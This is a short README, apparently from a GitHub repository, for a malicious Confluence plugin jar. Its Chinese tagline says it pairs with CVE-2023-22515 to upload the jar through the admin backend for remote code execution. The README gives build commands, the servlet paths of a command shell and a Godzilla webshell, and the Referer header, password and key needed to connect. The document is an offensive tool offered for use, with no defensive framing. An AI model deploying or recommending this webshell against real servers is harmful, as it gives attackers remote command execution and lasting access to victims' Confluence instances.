
## aaaademo/Confluence-EvilJar

> 配合 CVE-2023-22515 后台上传jar包实现RCE
```bash
git clone https://github.com/aaaademo/Confluence-EvilJar
cd Confluence-EvilJar
mvn package
```

### CMDshell

```
http://confluence.local/plugins/servlet/testbin/cmServlet

```

### 哥斯拉webshell连接方式

```
http://confluence.local/plugins/servlet/testbin/gzServlet

Referer: https://www.baidu.com/

p@ssw0rd / key
```

